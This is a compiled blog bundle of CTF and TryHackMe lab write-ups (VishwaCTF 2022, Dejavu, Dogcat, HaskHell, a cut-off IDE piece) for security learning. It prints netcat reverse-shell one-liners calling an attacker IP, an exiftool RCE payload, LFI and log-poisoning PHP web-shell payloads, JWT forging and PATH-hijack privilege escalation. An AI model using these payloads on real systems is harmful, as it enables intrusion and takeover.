"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[5066],{1685:function(e){e.exports=JSON.parse('{"blogPosts":[{"id":"vishwactf2022","metadata":{"permalink":"/Cybernotes/blog/vishwactf2022","source":"@site/blog/2022-03-21-vishwaCTF2022/writeup.md","title":"VishwaCTF 2022 writeups","description":"VishwaCTF 2022 web,osint,crypto and forensics challenge writeups","date":"2022-03-21T00:00:00.000Z","formattedDate":"March 21, 2022","tags":[{"label":"web","permalink":"/Cybernotes/blog/tags/web"},{"label":"OSINT","permalink":"/Cybernotes/blog/tags/osint"},{"label":"forensics","permalink":"/Cybernotes/blog/tags/forensics"},{"label":"crypto","permalink":"/Cybernotes/blog/tags/crypto"}],"readingTime":5.13,"truncated":false,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"VishwaCTF 2022 writeups","description":"VishwaCTF 2022 web,osint,crypto and forensics challenge writeups","authors":["shivam"],"image":"/img/ctftime/vishwactf2022.png","slug":"vishwactf2022","tags":["web","OSINT","forensics","crypto"]},"nextItem":{"title":"THM Dejavu writeup","permalink":"/Cybernotes/blog/dejavu"}},"content":"## Intro\\n\\nVishwaCTF 2022 was Fun CTF challenge. me and my team participated in it as `W3 4R3 N00BS` team and we got top 100 in this CTF. ofcourse it\'s not a good rank because we don\'t have any forensics,crypto and reversing players and also their OSINT and stegno challenges were only related to guesswork. that\'s why we were able to do only 1 OSINT challenge. If you are interested in joining our team then contact us through our [discord server](https://discord.gg/2KJJMQ8DRP)\\n\\nThis is the scoreboard for our team.\\n\\n![](https://cdn.discordapp.com/attachments/833787171130834951/955090566348152902/unknown.png)\\n\\n--\x3e I solved 11 challenges from my team. And in total our team have solved 18 challenges.\\n\\n![](Attachments/Pastedimage20220321040319.png)\\n\\nThese are the writeups for challenges which i solved.\\n\\n## web\\n\\n### Request me FLAG\\n\\nSo first of all if we go to main page then we will see this 404 page. This page is not really 404 but it\'s there just as rabbit hole.\\n\\n![](Attachments/Pastedimage20220321032855.png)\\n\\nSo it says request me so i tried to do things like going to `flag.php` or `home.php` but i haven\'t got anything.\\n\\nI also tried to find parameteres for this `404.php` file but no luck :(\\n\\nAnd after some time i again read the challenge description and i realized that it says `request me` so maybe what if we change the request method from `GET` to `FLAG`?\\n\\nSo let\'s try this!\\n\\ni intercepted the request and changed request method to `FLAG` like this:\\n\\n![](Attachments/Pastedimage20220321033308.png)\\n\\nBut i didn\'t found anything. but wait! let\'s try this method for `/`\\n\\nAnd boom i got the flag!\\n\\n![](Attachments/Pastedimage20220321033404.png)\\n\\n### Keep your secrets\\n\\n--\x3e In this challenge we have one api with GET method route which is `/api/signup/{username}` and POST method route which is `/api/login/user` with token in header\\n\\n![](Attachments/Pastedimage20220321033546.png)\\n\\nBut what\'s token here? So let\'s first try to register a user and let\'s name it `admin`\\n\\nso i intercepted the request and registereed a user and i got one jwt token.\\n\\n![](Attachments/Pastedimage20220321033745.png)\\n\\nAnd token looks like this:\\n\\n```\\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2NDc4NDgyMjV9.nl2_Vz9Vq5cfmhssnV_djgGGJ09f3KpCf_hMxu18jsY\\n```\\n\\nSo let\'s goto [jwt.io](https://jwt.io/) and check this token\\n\\nAnd i found that there is 3 fields in token: `username`,`role` and `iat`\\n\\n![](Attachments/Pastedimage20220321033932.png)\\n\\nSo now let\'s check the POST route which says it\'s only accessible by admins and it\'s asking for a token. So maybe if we can change the `role` to `admin` in jwt token and pass it in `token` header then we can access this page!\\n\\nSo for that first we need to crack the secret for this jwt.\\n\\nAnd i found it with john the ripper tool.\\n\\n![](https://cdn.discordapp.com/attachments/898560816457072691/955016432796725269/unknown.png)\\n\\nSo now we just have to use this secret to sign our jwt token which have admin as role and then just pass it in token header!\\n\\nSo after changing required fields, jwt token looks like this:\\n\\n```\\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjQ3ODQ4MjI1fQ.7oOS5McgiZO-TZx3aIMB8u4XkcOA98MlmYPxFKk6N7Y\\n```\\n\\nSo now let\'s just pass it through headers in POST route.\\n\\nRequest:\\n\\n![](Attachments/Pastedimage20220321034503.png)\\n\\nResponse:\\n\\n![](Attachments/Pastedimage20220321034517.png)\\n\\nAnd we got our flag : `vishwactf{w3@k_$ecr3t$}`\\n\\n### strong encryption\\n\\n--\x3e This challenge was more like reversing the encryption. so going to the page gives us this php code which have encryption function and we have given one encrypted flag and we have to decrypt it by analysing this encryption method!\\n\\n```php\\n <?php //\xa0Decrypt\xa0->\xa0576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982452f12f4712f4c769a75b33cb995fa169056168939a8b0b28eafe0d724f18dc4a7 $flag=\\"\\";\\n\\n\xa0\xa0\xa0\xa0function encrypt($str,$enKey){ $strHex=\'\'; $Key=\'\'; $rKey=69; $tmpKey=\'\';\\n\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0for($i=0;$i<strlen($enKey);$i++){ $Key.=ord($enKey[$i])+$rKey; $tmpKey.=chr(ord($enKey[$i])+$rKey);\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0} $rKeyHex=dechex($rKey); $enKeyHash = hash(\'sha256\',$tmpKey);\\n\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0for\xa0($i=0,$j=0; $i < strlen($str); $i++,$j++){\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0if($j==strlen($Key)){ $j=0;\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0} $strHex .= dechex(ord($str[$i])+$Key[$j]);\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0} $encTxt = $strHex.$rKeyHex.$enKeyHash;\\n\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0return $encTxt;\\n\xa0\xa0\xa0\xa0} $encTxt = encrypt($flag, \\"VishwaCTF\\");\\n\\n\xa0\xa0\xa0\xa0echo $encTxt;\\n\\n?>\\n```\\n\\nSo i made this script for decrypting the flag:\\n\\n```php\\n<?php\\n\\n$flag = \\"576e78697e65445c4a7c8033766770357c3960377460357360703a6f6982\\";\\n$key = \\"155174184173188166136153139\\";\\n\\n$finalflag = \'\';\\n\\nfor($i=0,$j=0;$i<strlen($flag);$i+=2,$j++){\\n\\tif($j==strlen($key)){\\n\\t\\t$j=0;\\n\\t}\\n\\t$temp = $flag[$i].$flag[$i+1];\\n\\t$dectemp = hexdec($temp);\\n\\t$dectemp = $dectemp - $key[$j];\\n\\t$chrtemp = chr($dectemp);\\n\\t$finalflag .= $chrtemp;\\n}\\necho $finalflag;\\n\\n?>\\n```\\n\\nAnd i got the flag: `VishwaCTF{y0u_h4v3_4n_0p_m1nd}`\\n\\n## Cryptography\\n\\n### John the Rocker\\n\\n--\x3e In this challenge, we have one `id_rsa` which have a passphrase and we have to decrypt it to get the flag. We can do this using [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)\\n\\nFirst convert this id_rsa file to john readable format using ssh2john\\n\\n```\\nssh2john.py id_rsa > converted\\n```\\n\\nAfter that use john the ripper tool to crack the passphrase for this id_rsa\\n\\n```\\njohn --wordlist=/usr/share/wordlists/rockyou.txt converted\\n```\\n\\nAnd we got our flag!\\n\\n![](Attachments/Pastedimage20220321035246.png)\\n\\n`vishwactf{!!**john**!!}`\\n\\n## Forensics\\n\\n### So grateful\\n\\n--\x3e In this challenge, we have one pcap file in which we have to find the password. so let\'s analyse it using [wireshark](https://www.wireshark.org/)\\n\\nAnd after analysing the tcp streams i found password in 5th TCP stream which looks like this:\\n\\n```\\nPOST /pages/main.html HTTP/1.1\\nReferer: 10.0.0.1:8080/index.html\\nUser-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9*/*;q=0.8\\nHost: 10.0.0.1:8080\\nConnection: Keep-Alive\\nContent-Type: application/x-www-form-urlencoded\\nContent-Length: 41\\nAccept-Language: en-US,en;q=0.5\\n\\nuserid=spiveyp&pswrd=S04xWjZQWFZ5OQ%3D%3DHTTP/1.0 200 OK\\nServer: BaseHTTP/0.3 Python/2.7.9\\nDate: Sat, 19 Mar 2016 02:12:42 GMT\\nContent-type: text/html\\n```\\n\\nAnd after decoding the password with `URL->base64` i found the flag!\\n\\n`vishwactf{KN1Z6PXVy9}`\\n\\n## OSINT\\n\\n### Rocket Raccoon\\n\\nChallenge description was like this:\\n\\n```\\nWho is \'racckoonn\' exactly? Intel has that their owner has leaked some private information.\\n```\\n\\n--\x3e So i googled for it but didn\'t found anything relatable. So after that i guessed that it can be a username so i used [sherlock](https://github.com/sherlock-project/sherlock) to find the accounts for that username.\\n\\nAnd i found many accounts but instagram looks interesting!\\n\\n![](Attachments/Pastedimage20220321041057.png)\\n\\nAnd i found [this](https://www.instagram.com/racckoonn/) account in which i found one more interesting thing!\\n\\nI found this caption in one of the post:\\n\\n```\\nCheck out my mum\'s new YouTube channel!\\nhttps://www.youtube.com/channel/UCDurVPcUypifNkJVrHxJ3vQ\\n```\\n\\nSo After going there i found one more username as `JohnsonM3llisa` So i used sherlock on this also!\\n\\n![](Attachments/Pastedimage20220321041359.png)\\n\\nAnd boom i found twitter account!\\n\\nAfter going there i found one tweet :\\n\\n```\\nOOPS! Almost leaked some private information, hope there is no way to get it back haha\\n```\\n\\nSo maybe they deleted the private info and there is a one way to see deleted info from social media accounts which is [waybackmachine](https://archive.org/web/)\\n\\nSo i went there and pasted their twitter profile link and found the flag!\\n\\n![](Attachments/Pastedimage20220321041639.png)\\n\\nAnd we found the flag : `Vishwactf{R4cc00ns_4r3_Sm4rt}`\\n\\n## Conclusion\\n\\n--\x3e All web challenges were fun but i didn\'t liked their OSINT,misc and stegnography challenges because there were too many guesswork to do.\\n\\nThanks for reading. :)"},{"id":"dejavu","metadata":{"permalink":"/Cybernotes/blog/dejavu","source":"@site/blog/2022-03-02-Dejavu/Dejavu.md","title":"THM Dejavu writeup","description":"Tryhackme Dejavu room writeup","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"exiftool","permalink":"/Cybernotes/blog/tags/exiftool"},{"label":"SUID","permalink":"/Cybernotes/blog/tags/suid"},{"label":"PATH","permalink":"/Cybernotes/blog/tags/path"}],"readingTime":1.94,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM Dejavu writeup","description":"Tryhackme Dejavu room writeup","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png","slug":"dejavu","tags":["exiftool","SUID","PATH"]},"prevItem":{"title":"VishwaCTF 2022 writeups","permalink":"/Cybernotes/blog/vishwactf2022"},"nextItem":{"title":"THM Dogcat writeup","permalink":"/Cybernotes/blog/dogcat"}},"content":"Hello everyone,\\n\\nToday we are going to solve Dejavu room from tryhackme. we will see about exiftool RCE and privilege escalation with PATH variable and systemctl SUID.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/db58ef402783e8d637df6c04ea9e6142.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)\\n| ssh-hostkey:\\n|   3072 30:0f:38:8d:3b:be:67:f3:e0:ca:eb:1c:93:ad:15:86 (RSA)\\n|   256 46:09:66:2b:1f:d1:b9:3c:d7:e1:73:0f:2f:33:4f:74 (ECDSA)\\n|_  256 a8:43:0e:d2:c1:a9:d1:14:e0:95:31:a1:62:94:ed:44 (ED25519)\\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\\n|_http-title: Dog Gallery!\\n```\\n\\n## Gobuster results\\n\\n```bash\\n===============================================================\\n/favicon.ico          (Status: 200) [Size: 21665]\\n/index.html           (Status: 301) [Size: 0] [--\x3e ./]\\n/upload               (Status: 301) [Size: 0] [--\x3e upload/]\\n===============================================================\\n```\\n\\n## Enumration\\n\\n--\x3e I found this page on port `80`\\n\\n![](Attachments/Pastedimage20220215131947.png)\\n\\n--\x3e And when we click on any photo then it redirects us to `/dog/getexifdata` and for caption and title it was using `/dog/getmetadata` path which i found from burpsuite.\\n\\n--\x3e Also i found the version of `exiftool` from response from `getexifdata` route\\n\\n![](Attachments/Pastedimage20220215132320.png)\\n\\n--\x3e So i searched for `exiftool version 12.23 exploit` and found [this](https://github.com/OneSecCyber/JPEG_RCE \\"https://github.com/OneSecCyber/JPEG_RCE\\") repo which describes the exploit in detail\\n\\nSo i added the reverse shell in the image file using exiftool\\n\\n```bash\\nexiftool -config eval.config runme.jpg -eval=\'system(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.10 4444 >/tmp/f\\")\'\\n```\\n\\n--\x3e After that i went to `/upload/` where we can upload our image so i uploaded my payload and started the netcat listener on port `4444`\\n\\n![](Attachments/Pastedimage20220215133145.png)\\n\\nNow let\'s just click on the uploaded image to let the server see the exifdata of image and we can get the reverse shell.\\n\\nAnd boom i got the reverse shell!\\n\\n![](Attachments/Pastedimage20220215132900.png)\\n\\n## Privesc\\n\\n--\x3e This file contains one SUID binary called `serverManager`. when we run that binary it asks for input from `0` or `1`\\n\\n```\\n0 -\\tGet server status\\n1 -\\tRestart server\\n```\\n\\n--\x3e so here it\'s restarting the server means it must be running as root SUID binary. so we can use this as privesc factor.\\n\\nSo let\'s see the source code provided with it.\\n\\n![](Attachments/Pastedimage20220215133406.png)\\n\\n--\x3e I found that it\'s using `systemctl` so let\'s change the path variable for that and get the root shell!\\n\\nSo follow these commands:\\n\\n```\\necho \\"/bin/bash -p\\" > systemctl\\nchmod 777 systemctl\\nexport PATH=.:$PATH\\n```\\n\\nAnd now if you run the `serverManager` binary and select `0` then you will get root shell!!\\n\\n--\x3e And we pwned the machine!\\n\\n![](Attachments/Pastedimage20220215133710.png)"},{"id":"dogcat","metadata":{"permalink":"/Cybernotes/blog/dogcat","source":"@site/blog/2022-03-02-Dogcat/Dogcat.md","title":"THM Dogcat writeup","description":"Tryhackme Dogcat room writeup","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"php wrappers","permalink":"/Cybernotes/blog/tags/php-wrappers"},{"label":"log poisoning","permalink":"/Cybernotes/blog/tags/log-poisoning"},{"label":"env","permalink":"/Cybernotes/blog/tags/env"},{"label":"docker","permalink":"/Cybernotes/blog/tags/docker"},{"label":"crontab","permalink":"/Cybernotes/blog/tags/crontab"}],"readingTime":3.445,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM Dogcat writeup","description":"Tryhackme Dogcat room writeup","authors":["shivam"],"slug":"dogcat","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png","tags":["php wrappers","log poisoning","env","docker","crontab"]},"prevItem":{"title":"THM Dejavu writeup","permalink":"/Cybernotes/blog/dejavu"},"nextItem":{"title":"THM HaskHell writeup","permalink":"/Cybernotes/blog/haskhell"}},"content":"Hello everyone,\\n\\nToday we are going to solve Dogcat room from tryhackme. we will learn about php wrappers,log poisoning,docker and privesc with `env` SUID binary.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/ce2fe16cfcdac475834f262306243b0a.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)\\n|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)\\n|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.38 ((Debian))\\n|_http-server-header: Apache/2.4.38 (Debian)\\n|_http-title: dogcat\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n## Gobuster results\\n\\n```bash\\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/THM/Dogcat]\\n\u2514\u2500$ gobuster dir -u http://10.10.238.89/ -w /usr/share/wordlists/dirb/common.txt -t 30 2>/dev/null\\n===============================================================\\nGobuster v3.1.0\\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\\n===============================================================\\n[+] Url:                     http://10.10.238.89/\\n[+] Method:                  GET\\n[+] Threads:                 30\\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\\n[+] Negative Status codes:   404\\n[+] User Agent:              gobuster/3.1.0\\n[+] Timeout:                 10s\\n===============================================================\\n2021/10/17 12:34:31 Starting gobuster in directory enumeration mode\\n===============================================================\\n/.htpasswd            (Status: 403) [Size: 277]\\n/.hta                 (Status: 403) [Size: 277]\\n/.htaccess            (Status: 403) [Size: 277]\\n/cats                 (Status: 301) [Size: 311] [--\x3e http://10.10.238.89/cats/]\\n/index.php            (Status: 200) [Size: 418]\\n/server-status        (Status: 403) [Size: 277]\\n===============================================================\\n2021/10/17 12:35:03 Finished\\n===============================================================\\n```\\n\\n---\\n\\n--\x3e I tried many payloads but didn\'t succeed. i also tried with null character but still getting error\\n\\nThen i tried this payload : `php://filter/convert.base64-encode/resource=dog/../index`\\n\\n--\x3e And i got the base64 encoded output!\\n\\n![](Attachments/Pastedimage20211017133712.png)\\n\\n--\x3e After decoding it i got the source code of `index.php`\\n\\n```php\\n<!DOCTYPE HTML>\\n<html>\\n\\n<head>\\n    <title>dogcat</title>\\n    <link rel=\\"stylesheet\\" type=\\"text/css\\" href=\\"/style.css\\">\\n</head>\\n\\n<body>\\n    <h1>dogcat</h1>\\n    <i>a gallery of various dogs or cats</i>\\n\\n    <div>\\n        <h2>What would you like to see?</h2>\\n        <a href=\\"/?view=dog\\"><button id=\\"dog\\">A dog</button></a> <a href=\\"/?view=cat\\"><button id=\\"cat\\">A cat</button></a><br>\\n        <?php\\n            function containsStr($str, $substr) {\\n                return strpos($str, $substr) !== false;\\n            }\\n\\t    $ext = isset($_GET[\\"ext\\"]) ? $_GET[\\"ext\\"] : \'.php\';\\n            if(isset($_GET[\'view\'])) {\\n                if(containsStr($_GET[\'view\'], \'dog\') || containsStr($_GET[\'view\'], \'cat\')) {\\n                    echo \'Here you go!\';\\n                    include $_GET[\'view\'] . $ext;\\n                } else {\\n                    echo \'Sorry, only dogs or cats are allowed.\';\\n                }\\n            }\\n        ?>\\n    </div>\\n</body>\\n\\n</html>\\n```\\n\\n--\x3e here we can see that there is a another parameter which is `ext` and i also got this parameter from arjun. So we can see this parameter is appending after the value of `view` so we have to make the `ext` null and then we can bypass this i guess.\\n\\n--\x3e and i used this payload : `php://filter/convert.base64-encode/resource=dog/../../../../../../../../../etc/passwd&ext=`\\n\\nAnd got the `/etc/passwd` file\\n\\n![](Attachments/Pastedimage20211017134853.png)\\n\\n```bash\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n```\\n\\n--\x3e Then i have read `/var/log/apache2/access.log` file and i got the apache2 logs and there i found that the user-agent was reflecting so There is a chance to do `log poisoning`\\n\\nI used this payload to read the access log : `dog/../../../../../../../../../var/log/apache2/access.log&ext=`\\n\\n![](Attachments/Pastedimage20211018101340.png)\\n\\n--\x3e After that i changed the User-agent with `<?php system($_GET[\'c\']); ?>` and added one more parameter with the value : `&c=ls`\\n\\nSo final payload will be :\\n\\n```bash\\ndog/../../../../../../../../../var/log/apache2/access.log&ext=&c=ls\\n```\\n\\nAnd boom we got the result !\\n\\n![](Attachments/Pastedimage20211018102449.png)\\n\\nGot the first flag in `flag.php`\\n\\n![](Attachments/Pastedimage20211018102631.png)\\n\\nAfter that i uploaded my php reverse shell using curl\\n\\n```bash\\ncurl http://<ip>:<port>/shell.php\\n```\\n\\nAfter that execute the file\\n\\n```bash\\nphp shell.php\\n```\\n\\n--\x3e And i got the reverse shell !\\n\\n![](Attachments/Pastedimage20211018103258.png)\\n\\n--\x3e Got the second flag in `/var/www`\\n\\n![](Attachments/Pastedimage20211018103551.png)\\n\\n--\x3e i found the `/env` as runnable by root without password and it was SUID also\\n\\ni run this command from gtfobins : `sudo /usr/bin/env /bin/bash`\\n\\n--\x3e And got the root shell !\\n\\n![](Attachments/Pastedimage20211018105059.png)\\n\\n--\x3e Found flag3 in `/root` directory\\n\\n![](Attachments/Pastedimage20211018105139.png)\\n\\n--\x3e i tried to search for a flag4 in every directory but i didn\'t found anything then i found one file called `backup.sh` in `/opt` directory. It was extracting the backup.tar file and then placing it to `/root/container` but there is a no folder named `container` in root directory so i made one reverse shell payload and uploaded it into `backup.sh` file and it is a maybe a crontab so it will execute automatically\\n\\n--\x3e And after some time i got the reverse shell as root but this time the root directory was changed and i got the flag4 there also\\n\\n![](Attachments/Pastedimage20211018111337.png)\\n\\n--\x3e That means this was the another docker environment and we were in another environment before!"},{"id":"haskhell","metadata":{"permalink":"/Cybernotes/blog/haskhell","source":"@site/blog/2022-03-02-haskHell/haskhell.md","title":"THM HaskHell writeup","description":"Tryhackme HaskHell room writeup","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"haskell","permalink":"/Cybernotes/blog/tags/haskell"},{"label":"flask","permalink":"/Cybernotes/blog/tags/flask"}],"readingTime":1.655,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM HaskHell writeup","description":"Tryhackme HaskHell room writeup","authors":["shivam"],"slug":"haskhell","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/fcf1ff6eabd1d1e09500184b049a2e66.png","tags":["haskell","flask"]},"prevItem":{"title":"THM Dogcat writeup","permalink":"/Cybernotes/blog/dogcat"},"nextItem":{"title":"THM IDE writeup","permalink":"/Cybernotes/blog/ide"}},"content":"Hello everyone,\\n\\nToday we are going to solve haskhell machine from Tryhackme. we will learn how to get reverse shell with haskhell and how to escalate our privileges with flask.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/fcf1ff6eabd1d1e09500184b049a2e66.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT     STATE SERVICE VERSION\\n22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 1d:f3:53:f7:6d:5b:a1:d4:84:51:0d:dd:66:40:4d:90 (RSA)\\n|   256 26:7c:bd:33:8f:bf:09:ac:9e:e3:d3:0a:c3:34:bc:14 (ECDSA)\\n|_  256 d5:fb:55:a0:fd:e8:e1:ab:9e:46:af:b8:71:90:00:26 (ED25519)\\n5001/tcp open  http    Gunicorn 19.7.1\\n|_http-server-header: gunicorn/19.7.1\\n|_http-title: Homepage\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\n```\\n\\n--\x3e I got this page on port `5001`\\n\\n![](Attachments/Pastedimage20220104121541.png)\\n\\n--\x3e After reading the content of website i found that this website is only accepting the haskell(.hs) file so i googled how to execute system commands in haskell and i found this code.\\n\\n```hs\\nimport System.Process\\n\\nmain = callCommand \\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.10 4444 >/tmp/f\\"\\n```\\n\\n--\x3e But where we will upload this file so let\'s run the gobuster !\\n\\n## Gobuster results\\n\\n--\x3e I found only one directory called `/submit` in which we can upload file so i uploaded my payload there and after clicking upload button i got the reverse shell !\\n\\n![](Attachments/Pastedimage20220104122310.png)\\n\\n## Privesc\\n\\n--\x3e i found the ssh keys of `prof` user in his home dir.\\n\\nafter logging in as that user i found that we can run `/usr/bin/flask run` as root so i found one directory in same directory called `__pycache__` in which i found 2 files in which one file was getting executed by root so i done strings on it and i found it\'s using `/home/prof/app.py` file but i didn\'t found any file so i made one !\\n\\n![](https://cdn.discordapp.com/attachments/927969387514847273/927970364645052506/unknown.png)\\n\\n![](https://cdn.discordapp.com/attachments/927969387514847273/927970747534692412/unknown.png)\\n\\nand added this code :\\n\\n```py\\nimport os\\nos.system(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.10.10 6969 >/tmp/f\\")\\n```\\n\\n--\x3e But after running the file i got one error and i found that we have to add that file as FLASK_APP environmental variable\\n\\n```bash\\nexport FLASK_APP=app.py\\n```\\n\\nand after that i again ran `sudo /usr/bin/flask run` and got the root shell !"},{"id":"ide","metadata":{"permalink":"/Cybernotes/blog/ide","source":"@site/blog/2022-03-02-IDE/IDE.md","title":"THM IDE writeup","description":"Tryhackme IDE room writeup","date":"2022-03-02T00:00:00.000Z","formattedDate":"March 2, 2022","tags":[{"label":"FTP","permalink":"/Cybernotes/blog/tags/ftp"},{"label":"RCE","permalink":"/Cybernotes/blog/tags/rce"},{"label":"codiac","permalink":"/Cybernotes/blog/tags/codiac"},{"label":"pkexec","permalink":"/Cybernotes/blog/tags/pkexec"}],"readingTime":3.23,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"title":"THM IDE writeup","description":"Tryhackme IDE room writeup","authors":["shivam"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/3ce8e9c4d1da5eefef690e11f75798c7.png","slug":"ide","tags":["FTP","RCE","codiac","pkexec"]},"prevItem":{"title":"THM HaskHell writeup","permalink":"/Cybernotes/blog/haskhell"},"nextItem":{"title":"THM Jack-of-all-trades writeup","permalink":"/Cybernotes/blog/jack-of-all-trades"}},"content":"Hello everyone,\\n\\nToday we are going to solve IDE room from tryhackme. we will see about FTP enumration,codiac RCE and privilege escalation with pkexec SUID.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/3ce8e9c4d1da5eefef690e11f75798c7.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT      STATE SERVICE VERSION\\n21/tcp    open  ftp     vsftpd 3.0.3\\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\\n| ftp-syst:\\n|   STAT:\\n| FTP server status:\\n|      Connected to ::ffff:10.9.4.105\\n|      Logged in as ftp\\n|      TYPE: ASCII\\n|      No session bandwidth limit\\n|      Session timeout in seconds is 300\\n|      Control connection is plain text\\n|      Data connections will be plain text\\n|      At session startup, client count was 3\\n|      vsFTPd 3.0.3 - secure, fast, stable\\n|_End of status\\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)\\n|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)\\n|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)\\n80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: Apache2 Ubuntu Default Page: It works\\n62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: Codiad 2.8.4\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 19.38 